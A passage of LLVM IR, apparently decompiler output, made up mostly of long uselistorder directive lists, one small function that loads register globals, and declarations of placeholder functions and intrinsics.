332, 122, 328, 123, 320, 124, 256, 125, 352, 126, 315, 127, 223, 224, 225, 226, 227, 154, 228, 229, 230, 231, 232, 233, 234, 31, 32, 33, 235, 236 }
  uselistorder i32 4096, { 0, 1, 2, 3, 4, 21, 5, 6, 22, 7, 8, 9, 10, 23, 26, 11, 13, 29, 14, 27, 17, 28, 15, 12, 24, 16, 18, 25, 19, 20 }
  uselistorder i32 -2147483648, { 0, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 4, 5, 16, 17, 3, 2, 18, 19, 20, 21 }
  uselistorder i32 2097152, { 8, 9, 16, 0, 1, 2, 10, 11, 3, 4, 5, 12, 13, 14, 6, 7, 15 }
  uselistorder i32 2, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 208, 37, 38, 181, 182, 183, 185, 186, 187, 91, 188, 39, 121, 189, 190, 191, 40, 122, 192, 193, 194, 118, 123, 0, 197, 163, 166, 93, 124, 198, 125, 174, 41, 175, 199, 200, 201, 42, 209, 210, 211, 167, 184, 202, 203, 204, 205, 43, 44, 94, 95, 96, 97, 231, 232, 110, 233, 234, 98, 235, 236, 223, 212, 90, 213, 214, 45, 46, 215, 216, 126, 127, 237, 47, 176, 48, 99, 49, 50, 108, 177, 51, 238, 109, 224, 52, 53, 225, 54, 55, 89, 195, 56, 57, 58, 196, 59, 60, 61, 62, 111, 226, 227, 63, 64, 1, 168, 228, 65, 229, 206, 180, 2, 100, 169, 66, 67, 101, 102, 113, 103, 114, 104, 105, 106, 107, 92, 170, 171, 172, 217, 218, 119, 68, 69, 70, 71, 72, 120, 219, 115, 112, 73, 220, 221, 222, 230, 173, 74, 75, 165, 76, 77, 78, 79, 80, 81, 164, 82, 83, 84, 85, 86, 178, 87, 128, 129, 130, 179, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 116, 155, 117, 156, 157, 158, 159, 207, 88, 160, 161, 162 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_18880() local_unnamed_addr {
entry:
  %v3_18884 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_18884)
  %v31_1888c = load i32, i32* @r0, align 4
  ret i32 %v31_1888c

; uselistorder directives
  uselistorder i32* @r0, { 66, 267, 266, 48, 59, 268, 69, 269, 5, 70, 270, 271, 68, 71, 272, 34, 60, 273, 274, 275, 276, 105, 106, 72, 277, 278, 279, 280, 281, 282, 283, 23, 284, 285, 28, 286, 287, 288, 289, 290, 51, 6, 198, 201, 82, 199, 200, 2, 214, 213, 57, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 231, 232, 233, 237, 238, 239, 240, 241, 242, 243, 244, 85, 245, 246, 107, 108, 109, 110, 111, 247, 248, 249, 251, 250, 16, 343, 291, 292, 112, 113, 157, 212, 252, 253, 254, 255, 256, 32, 17, 18, 54, 369, 19, 41, 20, 21, 203, 3, 204, 125, 126, 127, 7, 344, 31, 293, 295, 296, 88, 297, 89, 90, 298, 299, 300, 91, 301, 302, 303, 304, 305, 306, 307, 308, 38, 309, 310, 311, 312, 40, 50, 202, 205, 206, 207, 208, 209, 210, 211, 24, 49, 114, 115, 116, 36, 33, 45, 44, 158, 159, 160, 370, 372, 373, 97, 98, 99, 100, 101, 102, 103, 104, 64, 46, 39, 117, 118, 371, 229, 230, 56, 175, 176, 177, 178, 179, 119, 120, 346, 55, 95, 96, 347, 8, 348, 349, 350, 345, 234, 83, 235, 236, 84, 65, 351, 352, 353, 354, 355, 27, 257, 43, 9, 53, 30, 313, 314, 315, 316, 63, 58, 364, 92, 317, 37, 258, 259, 357, 121, 10, 42, 318, 319, 320, 11, 12, 321, 322, 13, 15, 0, 1, 323, 324, 14, 325, 326, 327, 62, 93, 328, 329, 330, 331, 332, 61, 333, 22, 334, 335, 4, 336, 337, 122, 356, 123, 124, 358, 359, 360, 361, 161, 162, 163, 164, 338, 339, 340, 26, 128, 29, 35, 294, 47, 368, 129, 130, 131, 132, 133, 73, 74, 134, 135, 75, 76, 77, 136, 78, 137, 138, 79, 139, 80, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 165, 166, 167, 168, 169, 170, 171, 172, 86, 87, 173, 25, 174, 81, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 260, 261, 262, 263, 264, 94, 362, 363, 365, 367, 366, 265, 52, 341, 342, 67 }
  uselistorder void (i32)* @__pseudo_branch, { 0, 40, 41, 42, 46, 47, 34, 35, 36, 90, 31, 32, 33, 48, 1, 2, 3, 4, 5, 6, 95, 96, 97, 98, 91, 51, 92, 93, 94, 7, 28, 29, 30, 8, 9, 10, 11, 12, 86, 87, 88, 99, 100, 101, 52, 53, 54, 37, 38, 39, 55, 56, 57, 102, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 13, 14, 43, 44, 45, 70, 71, 16, 17, 49, 50, 72, 73, 74, 75, 76, 77, 18, 19, 20, 21, 22, 23, 24, 25, 26, 78, 79, 80, 81, 82, 83, 84, 85, 15, 27, 89 }
  uselistorder i32 0, { 0, 966, 1, 967, 968, 564, 394, 395, 969, 970, 971, 972, 973, 974, 975, 976, 977, 3, 4, 5, 978, 979, 2, 980, 981, 565, 6, 982, 983, 32, 566, 984, 985, 986, 987, 988, 989, 990, 991, 108, 107, 217, 218, 219, 992, 993, 994, 7, 995, 996, 33, 997, 998, 999, 34, 35, 210, 1000, 1001, 1002, 1003, 36, 211, 398, 1004, 1005, 1006, 1007, 1008, 1009, 37, 1010, 9, 8, 38, 567, 1011, 582, 568, 1012, 1013, 1014, 1015, 1016, 10, 597, 598, 599, 600, 601, 602, 603, 604, 583, 605, 606, 1017, 1018, 1019, 1020, 1021, 1022, 11, 1023, 569, 1024, 1025, 1026, 1027, 212, 213, 399, 1028, 1029, 13, 12, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 570, 571, 1037, 584, 1038, 1039, 585, 586, 1040, 1041, 572, 1042, 1043, 1044, 1045, 1046, 39, 753, 754, 53, 54, 763, 764, 755, 756, 757, 758, 759, 760, 761, 762, 765, 766, 773, 768, 769, 771, 770, 772, 116, 220, 796, 803, 221, 804, 133, 805, 134, 806, 135, 807, 136, 808, 222, 809, 1047, 1048, 813, 814, 1274, 223, 815, 816, 817, 818, 224, 819, 820, 88, 91, 92, 117, 821, 89, 822, 90, 823, 824, 825, 155, 156, 826, 827, 828, 225, 829, 830, 371, 831, 832, 400, 833, 834, 835, 836, 837, 838, 839, 840, 841, 118, 401, 402, 852, 853, 854, 855, 856, 857, 335, 858, 859, 860, 870, 861, 871, 872, 873, 874, 869, 157, 158, 875, 376, 367, 368, 403, 876, 877, 878, 880, 881, 882, 883, 40, 885, 886, 55, 887, 888, 889, 890, 893, 894, 895, 896, 897, 898, 226, 899, 900, 573, 901, 891, 879, 587, 332, 588, 892, 902, 903, 904, 905, 56, 907, 57, 906, 159, 908, 909, 227, 607, 608, 609, 610, 611, 119, 612, 613, 228, 41, 229, 614, 404, 615, 369, 230, 231, 405, 406, 233, 910, 911, 912, 913, 914, 234, 232, 407, 408, 915, 916, 917, 918, 409, 410, 411, 412, 919, 413, 920, 58, 59, 60, 61, 396, 235, 921, 137, 922, 237, 236, 414, 415, 142, 1275, 1276, 1277, 1278, 1279, 1049, 1050, 1051, 1052, 1053, 1054, 238, 109, 370, 1055, 1056, 1057, 93, 1280, 416, 1281, 1282, 1283, 160, 1058, 417, 1059, 1060, 1061, 1062, 1063, 1064, 377, 378, 620, 621, 239, 810, 811, 379, 812, 622, 623, 637, 695, 14, 161, 162, 249, 248, 243, 247, 244, 240, 242, 246, 245, 241, 797, 798, 799, 800, 418, 923, 924, 925, 250, 926, 930, 931, 932, 933, 934, 251, 935, 163, 936, 937, 938, 939, 252, 253, 940, 164, 1400, 1401, 1402, 336, 774, 775, 776, 337, 1403, 94, 338, 1404, 1405, 130, 62, 165, 589, 1065, 63, 166, 1066, 1067, 339, 655, 656, 340, 64, 777, 120, 254, 657, 658, 167, 590, 342, 1068, 65, 131, 1069, 1070, 341, 1406, 1407, 1408, 1409, 1410, 1413, 1414, 1415, 1416, 1417, 1418, 1419, 1420, 1421, 1422, 1411, 1412, 1423, 1424, 1425, 1426, 1427, 1428, 1429, 1430, 42, 1431, 1432, 1433, 1434, 1435, 43, 1436, 1437, 1438, 44, 1439, 1440, 1441, 45, 1442, 1443, 1444, 1445, 1446, 1447, 1448, 1449, 1450, 1451, 1452, 1453, 1454, 1455, 1456, 1457, 1458, 1459, 1460, 1461, 1462, 1463, 1464, 1465, 1468, 1469, 1470, 1471, 1472, 1473, 1474, 1466, 1467, 1475, 1476, 1477, 1478, 1479, 1480, 1481, 1482, 1483, 1484, 46, 1485, 1486, 1487, 1488, 1489, 47, 1490, 1491, 1492, 1493, 1494, 48, 1495, 1496, 1497, 1498, 1499, 1500, 1501, 1502, 1503, 1504, 1505, 1506, 1507, 1508, 1509, 1284, 1285, 1286, 419, 420, 1287, 1288, 168, 778, 1071, 1072, 1073, 1074, 1093, 256, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 170, 169, 257, 258, 1106, 1107, 1108, 1109, 1110, 1111, 171, 172, 1112, 1113, 1114, 1115, 1116, 1117, 49, 1118, 1119, 1120, 1121, 1122, 66, 259, 1123, 173, 423, 1124, 1125, 1126, 1127, 1128, 424, 1129, 425, 1130, 1131, 421, 1132, 1133, 422, 1134, 1135, 1136, 381, 1137, 1138, 1139, 1140, 255, 1141, 1142, 261, 1143, 380, 1144, 50, 1145, 1146, 1147, 1148, 1149, 1150, 426, 1151, 1152, 427, 428, 1153, 1154, 1155, 260, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 591, 1166, 1167, 1168, 1169, 1170, 1171, 1173, 1172, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 174, 1289, 1290, 1291, 15, 1293, 343, 262, 1189, 1188, 344, 1190, 1191, 175, 1192, 263, 265, 801, 264, 802, 266, 767, 176, 779, 784, 785, 780, 781, 782, 787, 788, 789, 267, 790, 791, 792, 793, 794, 783, 786, 795, 177, 624, 625, 626, 268, 616, 617, 269, 627, 632, 633, 634, 635, 270, 382, 271, 372, 373, 429, 628, 272, 629, 630, 178, 636, 1510, 1511, 1512, 862, 726, 1294, 631, 1513, 638, 1295, 1296, 1297, 273, 1298, 619, 696, 1514, 143, 1515, 697, 698, 699, 179, 274, 1516, 1517, 1299, 1300, 180, 581, 430, 1521, 1522, 431, 1523, 1524, 275, 346, 1525, 1526, 432, 95, 1527, 1528, 433, 1531, 1532, 1535, 563, 345, 1536, 434, 1533, 1534, 1518, 1519, 592, 276, 333, 618, 16, 17, 700, 277, 639, 641, 640, 278, 642, 643, 644, 435, 645, 148, 727, 138, 728, 281, 280, 279, 729, 181, 282, 1520, 842, 843, 844, 845, 846, 847, 284, 182, 848, 849, 850, 139, 283, 851, 436, 646, 183, 647, 184, 648, 285, 733, 734, 735, 18, 1390, 185, 186, 187, 286, 140, 649, 188, 287, 189, 437, 438, 1530, 288, 383, 190, 580, 191, 289, 1306, 1307, 1308, 1309, 1310, 290, 1311, 1312, 1313, 1314, 1315, 1316, 1317, 291, 1301, 439, 1302, 1303, 440, 1304, 1305, 192, 863, 441, 292, 864, 865, 866, 867, 868, 193, 1318, 1319, 296, 294, 295, 1320, 1321, 302, 301, 215, 293, 1322, 1323, 1324, 1325, 1326, 1327, 375, 374, 384, 442, 1328, 1329, 1330, 96, 1331, 298, 297, 299, 300, 214, 1332, 1333, 347, 1334, 1335, 149, 1336, 1337, 1338, 1339, 1340, 1193, 684, 741, 1194, 1195, 941, 1196, 1197, 942, 747, 748, 749, 194, 750, 751, 67, 97, 98, 304, 303, 1341, 305, 884, 306, 1198, 1199, 308, 1200, 1201, 307, 1202, 309, 927, 928, 929, 195, 196, 944, 943, 945, 946, 947, 948, 310, 949, 311, 1203, 1204, 348, 1205, 19, 150, 151, 1387, 121, 122, 123, 1388, 1389, 1537, 1538, 124, 312, 1206, 1207, 1208, 1209, 1210, 950, 951, 952, 953, 954, 313, 1343, 593, 1344, 1345, 197, 198, 199, 1346, 1347, 1351, 1348, 1349, 1350, 349, 365, 1352, 1353, 200, 314, 1356, 1354, 1355, 350, 1357, 201, 659, 660, 20, 21, 202, 955, 203, 1358, 1359, 22, 23, 204, 24, 701, 25, 26, 1211, 1212, 1213, 1214, 1215, 205, 1216, 1217, 1218, 1219, 1221, 1222, 1220, 1223, 206, 1224, 1227, 1225, 1226, 443, 444, 445, 446, 1228, 1229, 1230, 315, 316, 1231, 1232, 1233, 1234, 1235, 1236, 447, 1237, 1238, 448, 1239, 1241, 317, 1240, 351, 334, 1242, 1243, 1245, 207, 1246, 319, 1247, 102, 103, 100, 101, 1248, 449, 144, 141, 1249, 1250, 1251, 322, 320, 321, 450, 1252, 1253, 1254, 99, 318, 1255, 1256, 1257, 1258, 1259, 1260, 1261, 1262, 1263, 451, 145, 363, 110, 1264, 1265, 1266, 27, 323, 650, 651, 152, 104, 132, 1244, 352, 652, 653, 452, 654, 1360, 1361, 1362, 105, 106, 1363, 1364, 1365, 324, 1366, 1367, 1368, 1369, 1370, 453, 1371, 1372, 1373, 1374, 1375, 385, 386, 326, 325, 702, 353, 703, 704, 216, 366, 705, 706, 387, 707, 708, 454, 709, 710, 711, 1267, 1376, 208, 1377, 1378, 1380, 1381, 28, 29, 1379, 1342, 1292, 742, 1529, 1268, 1269, 455, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 30, 1075, 1076, 1077, 1078, 146, 1079, 327, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 328, 574, 594, 575, 576, 1087, 1088, 1089, 1090, 1091, 1092, 31, 1391, 1392, 147, 1393, 1394, 1395, 1396, 1397, 329, 1398, 577, 595, 578, 579, 1399, 596, 457, 462, 672, 673, 68, 125, 456, 69, 354, 463, 674, 70, 111, 460, 461, 71, 112, 464, 465, 675, 459, 355, 466, 458, 467, 676, 677, 678, 680, 364, 679, 681, 682, 470, 471, 468, 469, 683, 479, 472, 475, 473, 476, 474, 477, 685, 478, 480, 686, 687, 688, 481, 689, 690, 691, 482, 209, 692, 72, 359, 358, 693, 694, 73, 357, 356, 712, 74, 75, 76, 77, 78, 79, 80, 483, 488, 713, 714, 487, 360, 51, 52, 489, 715, 716, 717, 718, 484, 490, 723, 485, 486, 725, 81, 113, 724, 491, 730, 492, 493, 388, 494, 731, 495, 732, 496, 389, 497, 736, 737, 390, 498, 499, 738, 391, 361, 739, 740, 392, 500, 501, 393, 743, 744, 745, 502, 746, 82, 114, 115, 83, 84, 503, 504, 752, 505, 507, 956, 127, 508, 957, 958, 126, 509, 510, 959, 511, 960, 512, 961, 506, 962, 513, 514, 515, 963, 153, 154, 85, 964, 330, 517, 518, 519, 1270, 520, 1271, 521, 522, 516, 362, 523, 1272, 524, 1273, 525, 527, 1382, 1383, 526, 1384, 1385, 86, 128, 129, 1386, 528, 331, 87, 965, 719, 720, 397, 721, 722, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 1539, 1540, 1541, 1542, 1543, 1544, 1545, 1546, 1547, 1548, 1549, 1550, 1551, 1552, 1553 }
  uselistorder i32* @r4, { 51, 409, 13, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 52, 53, 54, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 214, 15, 215, 14, 216, 217, 218, 219, 223, 16, 5, 248, 249, 259, 260, 261, 262, 263, 264, 265, 266, 267, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 6, 294, 302, 303, 304, 305, 306, 307, 308, 309, 17, 310, 311, 335, 330, 331, 332, 336, 337, 338, 333, 334, 339, 340, 341, 342, 343, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 7, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 18, 20, 68, 19, 69, 70, 71, 72, 73, 362, 363, 364, 365, 368, 3, 366, 367, 10, 42, 373, 374, 369, 370, 371, 372, 11, 441, 550, 21, 551, 552, 553, 22, 554, 555, 556, 557, 558, 559, 560, 442, 443, 561, 562, 444, 445, 446, 77, 78, 79, 268, 269, 158, 159, 250, 251, 252, 253, 254, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 563, 564, 670, 671, 224, 225, 23, 8, 226, 124, 125, 126, 127, 128, 129, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 565, 566, 567, 568, 569, 570, 24, 571, 572, 227, 228, 229, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 25, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 26, 468, 469, 470, 27, 471, 28, 472, 473, 474, 475, 476, 9, 477, 0, 478, 479, 573, 480, 1, 255, 256, 257, 258, 220, 221, 222, 230, 231, 232, 29, 233, 234, 235, 30, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 80, 81, 82, 83, 74, 75, 76, 84, 85, 86, 12, 87, 88, 89, 90, 91, 92, 574, 575, 688, 689, 690, 576, 577, 694, 699, 700, 701, 702, 703, 704, 705, 691, 93, 94, 95, 187, 188, 189, 692, 693, 295, 31, 296, 297, 298, 299, 300, 301, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 190, 191, 192, 193, 32, 2, 194, 195, 196, 197, 198, 661, 662, 110, 111, 112, 199, 200, 201, 202, 203, 204, 106, 107, 108, 109, 113, 114, 663, 664, 665, 666, 667, 668, 695, 698, 115, 116, 117, 118, 578, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 33, 595, 596, 597, 598, 579, 580, 581, 582, 312, 313, 314, 315, 316, 317, 318, 319, 320, 34, 321, 322, 323, 324, 325, 326, 327, 328, 329, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 45, 612, 613, 4, 614, 615, 616, 617, 618, 619, 696, 697, 207, 208, 393, 394, 395, 396, 620, 621, 622, 623, 624, 625, 626, 627, 628, 344, 345, 346, 481, 482, 483, 484, 35, 485, 486, 487, 488, 489, 490, 46, 491, 492, 493, 494, 495, 397, 398, 399, 400, 36, 401, 402, 403, 37, 629, 630, 631, 634, 635, 636, 130, 131, 132, 404, 405, 406, 637, 638, 639, 160, 161, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 38, 540, 541, 542, 543, 544, 119, 120, 121, 525, 526, 47, 43, 527, 632, 633, 122, 123, 640, 641, 642, 39, 643, 40, 644, 41, 645, 646, 647, 648, 649, 650, 651, 162, 48, 163, 44, 164, 165, 166, 167, 168, 169, 170, 171, 545, 546, 547, 548, 652, 653, 654, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 172, 173, 174, 175, 176, 181, 182, 183, 184, 185, 186, 205, 206, 209, 210, 211, 212, 213, 407, 408, 549, 655, 656, 657, 658, 659, 660, 177, 178, 179, 180, 49, 50, 669 }
}

declare i32 @unknown_0() local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8* @__decompiler_undefined_function_1() local_unnamed_addr

declare i16 @__decompiler_undefined_function_2() local_unnamed_addr

declare i16* @__decompiler_undefined_function_3() local_unnamed_addr

declare i8 @__decompiler_undefined_function_4() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #0

; Function Attrs: noreturn nounwind
declare void @llvm.trap() #1

declare float @fabsf(float)

attributes #0 = { nounwind readnone }
attributes #1 = { noreturn nounwind }
